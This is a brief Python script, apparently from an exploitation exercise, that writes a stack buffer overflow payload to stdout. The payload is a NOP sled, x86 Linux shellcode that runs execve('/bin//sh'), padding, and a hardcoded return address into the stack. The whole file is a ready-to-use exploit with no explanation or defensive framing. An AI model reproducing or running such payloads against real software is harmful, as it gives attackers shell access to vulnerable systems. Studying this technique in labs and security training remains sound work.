'''payload for shellcode'''
import sys
# payload = b'a'*272
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = b'\x90'*128 + shellcode + b'a'*115 + b'\xd0\xd5\xff\xff'
sys.stdout.buffer.write(payload)